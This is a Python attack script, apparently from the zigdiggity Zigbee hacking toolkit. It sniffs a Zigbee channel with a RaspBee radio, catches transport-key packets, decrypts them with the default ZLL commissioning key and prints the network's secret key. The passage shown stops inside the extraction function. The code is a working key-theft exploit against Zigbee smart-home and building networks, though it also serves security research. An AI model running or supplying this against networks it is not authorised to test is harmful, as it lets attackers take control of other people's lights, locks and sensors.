#!/usr/bin/env python
import os
import sys
sys.path.append(os.getcwd() + "/zigdiggity")

import signal
import time
import argparse
from zigdiggity.radios.raspbee_radio import RaspbeeRadio
from zigdiggity.radios.observer_radio import ObserverRadio
import zigdiggity.observers.utils as observer_utils
from zigdiggity.packets.utils import get_extended_source, extended_address_bytes, get_pan_id
from zigdiggity.packets.aps import is_transport_key
import zigdiggity.crypto.utils as crypto_utils
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *
from zigdiggity.interface.console import print_notify, print_info, print_debug

def extractKey(hardware_radio, radio, channel):
    radio.set_channel(channel)
    
    print_notify("Listening to channel %d" % radio.get_channel())
    
    while True:
        frame = radio.receive()
        if is_transport_key(frame):
                print_notify("Got transport key packet")
                if get_extended_source(frame) is not None:
                    print("Got extended source")
                    extended_source_bytes = extended_address_bytes(get_extended_source(frame))
                    decrypted, valid = crypto_utils.zigbee_packet_decrypt(crypto_utils.DEFAULT_ZLL_COMMISSION_KEY, frame, extended_source_bytes)
                    if valid:
                        print_notify("Network key acquired for PAN 0x%04x" % get_pan_id(frame))
                        network_key = bytes(decrypted)[2:18]
                        print_info("Extracted key is 0x%s" % network_key.hex())
